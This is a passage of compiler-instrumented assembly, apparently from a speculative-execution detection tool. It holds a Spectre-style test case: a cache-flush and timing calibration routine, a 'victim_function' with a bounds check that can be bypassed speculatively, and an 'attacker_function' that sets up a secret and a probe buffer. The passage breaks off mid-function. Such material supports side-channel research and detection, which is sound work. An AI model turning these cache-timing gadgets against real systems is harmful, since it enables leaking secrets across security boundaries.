            leaq (.L__after_checkpoint__teapot___1013)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__ae20bfba_6a9b_4b3c_9285_d5eeec099e7e__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1013:

            nop
            jbe .L_14fb

            movl %ebp,%r12d
            movl %eax,%ebp
            movq %rbx,%r13
            movq %rcx,%rbx
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movabsq $dift_reg_tags,%rax
            movb 7(%rax),%cl
            movb %cl,12(%rax)
            movb (%rax),%cl
            movb 1(%rax),%bl
            movb %cl,7(%rax)
            movb %bl,13(%rax)
            movb 2(%rax),%cl
            movb %cl,1(%rax)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp .L_14fb
.L_1522:

            movl $0,%r12d
            movl $0,%ebp
            movl $0,%r13d
            movabsq $dift_reg_tags,%rbx
            movw $0,12(%rbx)
            movb $0,7(%rbx)
            movb $0,1(%rbx)
            movl $0,%ebx
.L_1538:

            callq __ctype_b_loc@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_decode_flush_reload_state__a9c7d194_ecf9_48f8_984c_fcdf38c0c0f4__teapot__

            movzbl %bpl,%ecx
            leaq (%rax),%rsi
            movq %rsi,(scratchpad)
            movq (%rax),%rdx
            testb $64,1(%rdx,%rcx,2)
            movl $63,%edx
            sete %sil
            movq %rsi,(scratchpad+8)
            cmovel %edx,%ebp
            leaq (%r14),%rsi
            movq %rsi,(scratchpad+16)
            movb %bpl,(%r14)
            movzbl %r12b,%edx
            leaq (%rax),%rsi
            movq %rsi,(scratchpad+24)
            movq (%rax),%rax
            testb $64,1(%rax,%rdx,2)
            movl $63,%r9d
            setne %sil
            movq %rsi,(scratchpad+32)
            cmovnel %r12d,%r9d
            movsbl %bpl,%edx
            leaq -8(%rsp),%rsi
            movq %rsi,(scratchpad+40)
            pushq %r13
.cfi_def_cfa_offset 56
            movzbl %r12b,%r12d
            leaq -8(%rsp),%rsi
            movq %rsi,(scratchpad+48)
            pushq %r12
.cfi_def_cfa_offset 64
            movsbl %r9b,%r9d
            movq %rbx,%r8
            movl %edx,%ecx
            leaq (.L_2090)(%rip),%rsi
            movl $1,%edi
            movl $0,%eax
            movq %rax,(scratchpad+524288)
            movabsq $dift_reg_tags,%rbp
            movb 7(%rbp),%al
            movb %al,2(%rbp)
            movabsq $scratchpad,%r14
            cmpq $0,8(%r14)
            je .LBB0_2_1024

            movb $0,7(%rbp)
            xorl %eax,%eax
.LBB0_2_1024:

            orb 14(%rbp),%al
            movabsq $35184372088832,%r12
            movq 16(%r14),%r13
            xorq %r12,%r13
            movb %al,(%r13)
            xorl %eax,%eax
            cmpq $0,32(%r14)
            je .LBB0_4_1024

            movl 12(%rbp),%eax
.LBB0_4_1024:

            movb %al,9(%rbp)
            movb 7(%rbp),%bl
            movb %bl,3(%rbp)
            movzbl 13(%rbp),%ebx
            movq 40(%r14),%rax
            xorq %r12,%rax
            movabsq $72340172838076673,%r13
            imulq %r13,%rbx
            movq %rbx,(%rax)
            movzbl 12(%rbp),%ebx
            xorq 48(%r14),%r12
            imulq %r13,%rbx
            movq %rbx,(%r12)
            movb 1(%rbp),%bl
            movb 3(%rbp),%r12b
            movb %bl,8(%rbp)
            movb %r12b,2(%rbp)
            movw $0,4(%rbp)
            movb $0,(%rbp)
            movq (scratchpad+524288),%rax
            callq __printf_chk__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_decode_flush_reload_state__e44c6f8e_8353_470d_989c_137d422c6558__teapot__

            addq $16,%rsp
.cfi_def_cfa_offset 48
            leaq (%rsp),%r12
            movq %r12,(scratchpad)
            popq %rbx
.cfi_def_cfa_offset 40
            leaq (%rsp),%r12
            movq %r12,(scratchpad+8)
            popq %rbp
.cfi_def_cfa_offset 32
            leaq (%rsp),%r12
            movq %r12,(scratchpad+16)
            popq %r12
.cfi_def_cfa_offset 24
            leaq (%rsp),%r13
            movq %r13,(scratchpad+24)
            popq %r13
.cfi_def_cfa_offset 16
            leaq (%rsp),%r14
            movq %r14,(scratchpad+32)
            popq %r14
.cfi_def_cfa_offset 8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movabsq $scratchpad,%rax
            movabsq $35184372088832,%rcx
            movq (%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movabsq $dift_reg_tags,%rdx
            movb %bl,1(%rdx)
            movq 8(%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movb %bl,7(%rdx)
            movq 16(%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movb %bl,12(%rdx)
            movq 24(%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movb %bl,13(%rdx)
            xorq 32(%rax),%rcx
            movb (%rcx),%al
            movb %al,14(%rdx)
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.cfi_endproc 
.size decode_flush_reload_state, . - decode_flush_reload_state
.align 2
#-----------------------------------
.globl calibrate_latency
.type calibrate_latency, @function
#-----------------------------------
calibrate_latency:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rsp,%rdi
            shrq $3,%rdi
            leaq 2147450880(%rdi),%rdi
            movb $255,(%rdi)
            endbr64 
            leaq -8(%rsp),%rdi
            movq %rdi,(scratchpad)
            pushq %rbp
.cfi_def_cfa_offset 16
.cfi_offset 6, -16
            leaq -8(%rsp),%rbp
            movq %rbp,(scratchpad+8)
            pushq %rbx
.cfi_def_cfa_offset 24
.cfi_offset 3, -24
            subq $8,%rsp
.cfi_def_cfa_offset 32
            movl $8,%edi
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rdx,(scratchpad+524304)
            movq %rsi,(scratchpad+524312)
            movabsq $dift_reg_tags,%rbp
            movzbl 7(%rbp),%ebx
            movabsq $scratchpad,%rdx
            movabsq $35184372088832,%rax
            movq (%rdx),%rsi
            xorq %rax,%rsi
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rbx
            movq %rbx,(%rsi)
            movzbl 1(%rbp),%ebx
            xorq 8(%rdx),%rax
            imulq %rcx,%rbx
            movq %rbx,(%rax)
            movb $0,5(%rbp)
            movq (scratchpad+524312),%rsi
            movq (scratchpad+524304),%rdx
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            callq malloc@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_calibrate_latency__b6db33d9_25b0_444c_b7e4_fcaaf5fd8af1__teapot__

            testq %rax,%rax
            leaq (.__trampoline__b6db33d9_25b0_444c_b7e4_fcaaf5fd8af1__teapot__)(%rip),%rsi
            movq %rsi,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1038)(%rip),%rsi
            movq %rsi,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__b6db33d9_25b0_444c_b7e4_fcaaf5fd8af1__teapot__)(%rip),%rsi
            movq %rsi,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1038:

            nop
            je .L_16b7

            movq %rax,%rbx
            leaq (%rbx),%rsi
            movq %rsi,(scratchpad)
            movb (%rbx),%al
            movl $1000,%esi
            movabsq $dift_reg_tags,%rdx
            movb (%rdx),%bpl
            movb %bpl,1(%rdx)
            movabsq $scratchpad,%r8
            movabsq $35184372088832,%r9
            xorq (%r8),%r9
            orb (%r9),%bpl
            movb %bpl,(%rdx)
            movw $0,4(%rdx)
            movl $0,%edi
.L_15ce:

            mfence 
            lfence 
            rdtsc 
            shlq $32,%rdx
            orq %rdx,%rax
            lfence 
            movq %rax,%r8
            leaq (%rbx),%rdx
            movq %rdx,(scratchpad)
            movb (%rbx),%al
            rdtscp 
            shlq $32,%rdx
            orq %rdx,%rax
            lfence 
            subq %r8,%rax
            addq %rax,%rdi
            subl $1,%esi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%rdx
            movb $0,8(%rdx)
            movb $0,(%rdx)
            movw $0,2(%rdx)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq (.__trampoline__f44d9fb5_9124_4190_ae6b_78059fb6eaa8__teapot__)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1043)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__f44d9fb5_9124_4190_ae6b_78059fb6eaa8__teapot__)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1043:

            nop
            jne .L_15ce

            shrq $3,%rdi
            movabsq $2361183241434822607,%rdx
            movq %rdi,%rax
            mulq %rdx
            shrq $4,%rdx
            movq %rdx,%r9
            movl $1000,%esi
            movabsq $dift_reg_tags,%rdx
            movw $0,3(%rdx)
            movb 5(%rdx),%r8b
            movb %r8b,(%rdx)
            movb $0,9(%rdx)
            movb $0,5(%rdx)
            movl $0,%edi
.L_1622:

            clflush (%rbx)
            mfence 
            lfence 
            rdtsc 
            shlq $32,%rdx
            orq %rdx,%rax
            lfence 
            movq %rax,%r8
            leaq (%rbx),%rbp
            movq %rbp,(scratchpad)
            movb (%rbx),%al
            rdtscp 
            shlq $32,%rdx
            orq %rdx,%rax
            lfence 
            subq %r8,%rax
            addq %rax,%rdi
            subl $1,%esi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%rdx
            movb $0,8(%rdx)
            movb $0,(%rdx)
            movw $0,2(%rdx)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq (.__trampoline__3f2be5c9_be44_4b3b_9ed0_cf84ebf303b7__teapot__)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1047)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__3f2be5c9_be44_4b3b_9ed0_cf84ebf303b7__teapot__)(%rip),%rdx
            movq %rdx,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1047:

            nop
            jne .L_1622

            shrq $3,%rdi
            movabsq $2361183241434822607,%rcx
            movq %rdi,%rax
            mulq %rcx
            movq %rdx,%rcx
            shrq $4,%rcx
            leaq (%r9,%rcx,2),%rdx
            movabsq $-6148914691236517205,%rbp
            movq %rdx,%rax
            mulq %rbp
            shrq $1,%rdx
            movq %rdx,%rbp
            movq %rdx,%r8
            movq %r9,%rdx
            leaq (.L_20f0)(%rip),%rsi
            movl $1,%edi
            movl $0,%eax
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movabsq $dift_reg_tags,%rbx
            movb 5(%rbx),%al
            movb 9(%rbx),%cl
            movb %al,2(%rbx)
            orb %cl,%al
            movb %al,7(%rbx)
            movb %al,8(%rbx)
            movb %cl,3(%rbx)
            movw $0,4(%rbx)
            movb $0,(%rbx)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            callq __printf_chk__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_calibrate_latency__f2c78883_cafe_4189_9142_3e2e7a7f80f8__teapot__

            movq %rbx,%rdi
            movabsq $dift_reg_tags,%rax
            movb 1(%rax),%bl
            movb %bl,5(%rax)
            callq free@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_calibrate_latency__48ba0df4_5a09_4457_9486_7852d5684508__teapot__

            movq %rbp,%rax
            addq $8,%rsp
.cfi_remember_state 
.cfi_def_cfa_offset 24
            leaq (%rsp),%rbp
            movq %rbp,(scratchpad)
            popq %rbx
.cfi_def_cfa_offset 16
            leaq (%rsp),%rbp
            movq %rbp,(scratchpad+8)
            popq %rbp
.cfi_def_cfa_offset 8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rsi,(scratchpad+524320)
            movabsq $dift_reg_tags,%rdx
            movb 7(%rdx),%sil
            movb %sil,(%rdx)
            movabsq $scratchpad,%rcx
            movabsq $35184372088832,%rbx
            movq (%rcx),%rax
            xorq %rbx,%rax
            movb (%rax),%sil
            movb %sil,1(%rdx)
            xorq 8(%rcx),%rbx
            movb (%rbx),%sil
            movb %sil,7(%rdx)
            movq (scratchpad+524320),%rsi
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_16b7:

.cfi_restore_state 
            leaq (__PRETTY_FUNCTION__.33725)(%rip),%rcx
            movl $134,%edx
            leaq (.L_2052)(%rip),%rsi
            leaq (.L_205c)(%rip),%rdi
            movabsq $dift_reg_tags,%r12
            movl $0,2(%r12)
            callq __assert_fail@PLT
.cfi_endproc 
.size calibrate_latency, . - calibrate_latency
.align 2
#-----------------------------------
.globl victim_function
.type victim_function, @function
#-----------------------------------
victim_function:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $255,(%rax)
            endbr64 
            leaq -8(%rsp),%rax
            movq %rax,(scratchpad)
            pushq %r15
.cfi_def_cfa_offset 16
.cfi_offset 15, -16
            leaq -8(%rsp),%rax
            movq %rax,(scratchpad+8)
            pushq %r14
.cfi_def_cfa_offset 24
.cfi_offset 14, -24
            leaq -8(%rsp),%rax
            movq %rax,(scratchpad+16)
            pushq %r13
.cfi_def_cfa_offset 32
.cfi_offset 13, -32
            leaq -8(%rsp),%r13
            movq %r13,(scratchpad+24)
            pushq %r12
.cfi_def_cfa_offset 40
.cfi_offset 12, -40
            leaq -8(%rsp),%r12
            movq %r12,(scratchpad+32)
            pushq %rbp
.cfi_def_cfa_offset 48
.cfi_offset 6, -48
            leaq -8(%rsp),%r12
            movq %r12,(scratchpad+40)
            pushq %rbx
.cfi_def_cfa_offset 56
.cfi_offset 3, -56
            subq $8,%rsp
.cfi_def_cfa_offset 64
            movq %rdi,%r13
            movq %rsi,%rbp
            movl %edx,%r12d
            movl %ecx,%r14d
            movl %r8d,%ebx
            leaq 10515(%rip),%rax
            movq %rax,(scratchpad+48)
            movl (array_size)(%rip),%eax
            shrl $1,%eax
            cmpl %r8d,%eax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rsi,(scratchpad+524320)
            movq %rax,(scratchpad+524336)
            lahf 
            seto %al
            movq %rax,(scratchpad+524328)
            movq (scratchpad+524336),%rax
            movabsq $dift_reg_tags,%rsi
            movzbl 15(%rsi),%edx
            movabsq $scratchpad,%rcx
            movabsq $35184372088832,%rbx
            movq (%rcx),%r15
            xorq %rbx,%r15
            movabsq $72340172838076673,%rax
            imulq %rax,%rdx
            movq %rdx,(%r15)
            movzbl 14(%rsi),%r15d
            movq 8(%rcx),%rdx
            xorq %rbx,%rdx
            imulq %rax,%r15
            movq %r15,(%rdx)
            movzbl 13(%rsi),%r15d
            movq 16(%rcx),%rdx
            xorq %rbx,%rdx
            imulq %rax,%r15
            movq %r15,(%rdx)
            movzbl 12(%rsi),%r15d
            movq 24(%rcx),%rdx
            xorq %rbx,%rdx
            imulq %rax,%r15
            movq %r15,(%rdx)
            movzbl 7(%rsi),%r15d
            movq 32(%rcx),%rdx
            xorq %rbx,%rdx
            imulq %rax,%r15
            movq %r15,(%rdx)
            movzbl 1(%rsi),%r15d
            movq 40(%rcx),%rdx
            xorq %rbx,%rdx
            imulq %rax,%r15
            movq %r15,(%rdx)
            movb 5(%rsi),%r15b
            movb %r15b,13(%rsi)
            movb 4(%rsi),%r15b
            movb %r15b,7(%rsi)
            movb 2(%rsi),%al
            movb 3(%rsi),%r15b
            movb %r15b,12(%rsi)
            movb %al,14(%rsi)
            movb 8(%rsi),%r15b
            movb %r15b,1(%rsi)
            xorq 48(%rcx),%rbx
            movb (%rbx),%r15b
            movb %r15b,(%rsi)
            movq %rax,(scratchpad+524336)
            movq (scratchpad+524328),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524336),%rax
            movq (scratchpad+524320),%rsi
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            leaq (.__trampoline__3cd42740_ca65_4fa1_ac56_645963515d05__teapot__)(%rip),%r15
            movq %r15,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1066)(%rip),%r15
            movq %r15,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__3cd42740_ca65_4fa1_ac56_645963515d05__teapot__)(%rip),%r15
            movq %r15,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1066:

            nop
            ja .L_170f

            leaq 10502(%rip),%rax
            movq %rax,(scratchpad)
            movl (array_size)(%rip),%eax
            cmpl %r8d,%eax
            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            movabsq $scratchpad,%rax
            movabsq $35184372088832,%r15
            xorq (%rax),%r15
            movb (%r15),%al
            movabsq $dift_reg_tags,%r15
            movb %al,(%r15)
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            leaq (.__trampoline__0c647829_3f6e_424c_8bc4_eec8c4caa290__teapot__)(%rip),%r15
            movq %r15,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1069)(%rip),%r15
            movq %r15,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__0c647829_3f6e_424c_8bc4_eec8c4caa290__teapot__)(%rip),%r15
            movq %r15,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1069:

            nop
            jae .L_1734
.L_170f:

            leaq (%r13),%rdi
            movq %rdi,(scratchpad)
            movq (%r13),%r15
            movl %ebx,%esi
            movq %r15,%rdi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movabsq $scratchpad,%rax
            movabsq $35184372088832,%rcx
            xorq (%rax),%rcx
            movb (%rcx),%al
            movabsq $dift_reg_tags,%rcx
            orb 13(%rcx),%al
            movb %al,15(%rcx)
            movb 1(%rcx),%bl
            movb %bl,4(%rcx)
            movb %al,5(%rcx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            callq realloc@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_victim_function__cb1729f6_691e_4b83_ad86_0c6f9a6d3b45__teapot__

            movq %rax,%rdi
            leaq (%r13),%rdx
            movq %rdx,(scratchpad)
            movq %rax,(%r13)
            leaq (array_size)(%rip),%rax
            movq %rax,(scratchpad+8)
            movl (array_size)(%rip),%edx
            movl %edx,%edx
            movq %r15,%rsi
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rdx,(scratchpad+524304)
            movq %rsi,(scratchpad+524312)
            movabsq $dift_reg_tags,%rax
            movb (%rax),%r15b
            movb %r15b,5(%rax)
            orb 13(%rax),%r15b
            movabsq $scratchpad,%rdx
            movabsq $35184372088832,%rbx
            movq (%rdx),%rsi
            xorq %rbx,%rsi
            movzbl %r15b,%r15d
            movabsq $72340172838076673,%rcx
            imulq %r15,%rcx
            movq %rcx,(%rsi)
            xorq 8(%rdx),%rbx
            movb (%rbx),%r15b
            movb %r15b,3(%rax)
            movb 15(%rax),%r15b
            movb %r15b,4(%rax)
            movq (scratchpad+524312),%rsi
            movq (scratchpad+524304),%rdx
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            callq memcpy__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_victim_function__083f6fe9_11da_4735_995b_57df6ce2b8d7__teapot__
.L_1734:

            movl %ebx,%ebx
            movl %r12d,%edx
            cmpq %rbx,%rdx
            sbbq %rdx,%rdx
            andl %r12d,%edx
            leaq (%r13),%r12
            movq %r12,(scratchpad)
            movq (%r13),%rax
            leaq (%rax,%rdx),%r12
            movq %r12,(scratchpad+8)
            movzbl (%rax,%rdx),%ecx
            imull %ecx,%r14d
            addq %r14,%rbp
            leaq (%rbp),%r12
            movq %r12,(scratchpad+16)
            movb (%rbp),%bpl
            movl $0,%eax
            addq $8,%rsp
.cfi_def_cfa_offset 56
            leaq (%rsp),%r12
            movq %r12,(scratchpad+24)
            popq %rbx
.cfi_def_cfa_offset 48
            leaq (%rsp),%r12
            movq %r12,(scratchpad+32)
            popq %rbp
.cfi_def_cfa_offset 40
            leaq (%rsp),%r12
            movq %r12,(scratchpad+40)
            popq %r12
.cfi_def_cfa_offset 32
            leaq (%rsp),%r13
            movq %r13,(scratchpad+48)
            popq %r13
.cfi_def_cfa_offset 24
            leaq (%rsp),%r15
            movq %r15,(scratchpad+56)
            popq %r14
.cfi_def_cfa_offset 16
            leaq (%rsp),%r15
            movq %r15,(scratchpad+64)
            popq %r15
.cfi_def_cfa_offset 8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rsi,(scratchpad+524320)
            movq %rdi,(scratchpad+524328)
            movabsq $dift_reg_tags,%rsi
            movb 12(%rsi),%cl
            movb %cl,3(%rsi)
            movabsq $scratchpad,%rax
            movabsq $35184372088832,%rbx
            movq (%rax),%rdx
            xorq %rbx,%rdx
            movb (%rdx),%dil
            orb 13(%rsi),%dil
            movb %dil,(%rsi)
            orb %cl,%dil
            movq 8(%rax),%rdx
            xorq %rbx,%rdx
            orb (%rdx),%dil
            movb %dil,2(%rsi)
            orb 14(%rsi),%dil
            movb %dil,14(%rsi)
            orb 7(%rsi),%dil
            movb %dil,7(%rsi)
            movq 16(%rax),%rdx
            xorq %rbx,%rdx
            orb (%rdx),%dil
            movb %dil,7(%rsi)
            movb $0,(%rsi)
            movq 24(%rax),%rdi
            xorq %rbx,%rdi
            movb (%rdi),%dil
            movb %dil,1(%rsi)
            movq 32(%rax),%rdi
            xorq %rbx,%rdi
            movb (%rdi),%dil
            movb %dil,7(%rsi)
            movq 40(%rax),%rdi
            xorq %rbx,%rdi
            movb (%rdi),%dil
            movb %dil,12(%rsi)
            movq 48(%rax),%rdi
            xorq %rbx,%rdi
            movb (%rdi),%dil
            movb %dil,13(%rsi)
            movq 56(%rax),%rdi
            xorq %rbx,%rdi
            movb (%rdi),%dil
            movb %dil,14(%rsi)
            xorq 64(%rax),%rbx
            movb (%rbx),%dil
            movb %dil,15(%rsi)
            movq (scratchpad+524328),%rdi
            movq (scratchpad+524320),%rsi
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.cfi_endproc 
.size victim_function, . - victim_function
#-----------------------------------
.globl attacker_function
.type attacker_function, @function
#-----------------------------------
attacker_function:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $255,(%rax)
            endbr64 
            leaq -8(%rsp),%rax
            movq %rax,(scratchpad)
            pushq %r15
.cfi_def_cfa_offset 16
.cfi_offset 15, -16
            leaq -8(%rsp),%rax
            movq %rax,(scratchpad+8)
            pushq %r14
.cfi_def_cfa_offset 24
.cfi_offset 14, -24
            leaq -8(%rsp),%rax
            movq %rax,(scratchpad+16)
            pushq %r13
.cfi_def_cfa_offset 32
.cfi_offset 13, -32
            leaq -8(%rsp),%r13
            movq %r13,(scratchpad+24)
            pushq %r12
.cfi_def_cfa_offset 40
.cfi_offset 12, -40
            leaq -8(%rsp),%r12
            movq %r12,(scratchpad+32)
            pushq %rbp
.cfi_def_cfa_offset 48
.cfi_offset 6, -48
            leaq -8(%rsp),%r12
            movq %r12,(scratchpad+40)
            pushq %rbx
.cfi_def_cfa_offset 56
.cfi_offset 3, -56
            subq $2168,%rsp
.cfi_def_cfa_offset 2224
            leaq %fs:40,%r12
            movq %r12,(scratchpad+48)
            movq %fs:40,%rax
            leaq 2152(%rsp),%r12
            movq %r12,(scratchpad+56)
            movq %rax,2152(%rsp)
            xorl %eax,%eax
            movq %rax,(scratchpad+524288)
            movabsq $dift_reg_tags,%r15
            movzbl 15(%r15),%r13d
            movabsq $scratchpad,%rax
            movabsq $35184372088832,%rbx
            movq (%rax),%rbp
            xorq %rbx,%rbp
            movabsq $72340172838076673,%r14
            imulq %r14,%r13
            movq %r13,(%rbp)
            movzbl 14(%r15),%ebp
            movq 8(%rax),%r13
            xorq %rbx,%r13
            imulq %r14,%rbp
            movq %rbp,(%r13)
            movzbl 13(%r15),%ebp
            movq 16(%rax),%r13
            xorq %rbx,%r13
            imulq %r14,%rbp
            movq %rbp,(%r13)
            movzbl 12(%r15),%ebp
            movq 24(%rax),%r13
            xorq %rbx,%r13
            imulq %r14,%rbp
            movq %rbp,(%r13)
            movzbl 7(%r15),%ebp
            movq 32(%rax),%r13
            xorq %rbx,%r13
            imulq %r14,%rbp
            movq %rbp,(%r13)
            movzbl 1(%r15),%ebp
            movq 40(%rax),%r13
            xorq %rbx,%r13
            imulq %r14,%rbp
            movq %rbp,(%r13)
            movq 48(%rax),%rbp
            xorq %rbx,%rbp
            movb 6(%r15),%r12b
            orb (%rbp),%r12b
            xorq 56(%rax),%rbx
            movzbl %r12b,%ebp
            imulq %r14,%rbp
            movq %rbp,(%rbx)
            movb $0,(%r15)
            movq (scratchpad+524288),%rax
            callq array_init

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__8a273969_4093_499e_9dc6_a0f66c7471d8__teapot__

            leaq 88(%rsp),%r12
            movq %r12,(scratchpad)
            movq %rax,88(%rsp)
            movl $0,%eax
            movabsq $dift_reg_tags,%r12
            movb (%r12),%r14b
            orb 6(%r12),%r14b
            movabsq $scratchpad,%r15
            movabsq $35184372088832,%r13
            xorq (%r15),%r13
            movzbl %r14b,%r14d
            movabsq $72340172838076673,%r15
            imulq %r14,%r15
            movq %r15,(%r13)
            movb $0,(%r12)
            callq secret_init

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__5ffacf72_e75f_4787_b4e6_ad84eef21fef__teapot__

            leaq 72(%rsp),%r12
            movq %r12,(scratchpad)
            movq %rax,72(%rsp)
            movq %rax,%rdx
            leaq 88(%rsp),%r12
            movq %r12,(scratchpad+8)
            subq 88(%rsp),%rdx
            leaq (.L_2061)(%rip),%rsi
            movl $1,%edi
            movl $0,%eax
            movabsq $dift_reg_tags,%rbp
            movb (%rbp),%bl
            orb 6(%rbp),%bl
            movabsq $scratchpad,%r14
            movabsq $35184372088832,%r12
            movq (%r14),%r13
            xorq %r12,%r13
            movzbl %bl,%ebx
            movabsq $72340172838076673,%r15
            imulq %rbx,%r15
            movq %r15,(%r13)
            movb (%rbp),%bl
            movb %bl,3(%rbp)
            orb 6(%rbp),%bl
            xorq 8(%r14),%r12
            orb (%r12),%bl
            movb %bl,3(%rbp)
            movw $0,4(%rbp)
            movb $0,(%rbp)
            callq __printf_chk__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__979cd9b7_9ec6_4338_b2e3_f365c2ab1f9f__teapot__

            movl $0,%r9d
            movl $4294967295,%r8d
            movl $34,%ecx
            movl $3,%edx
            movl $1048576,%esi
            movl $0,%edi
            movabsq $dift_reg_tags,%r12
            movw $0,8(%r12)
            movl $0,2(%r12)
            callq mmap@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
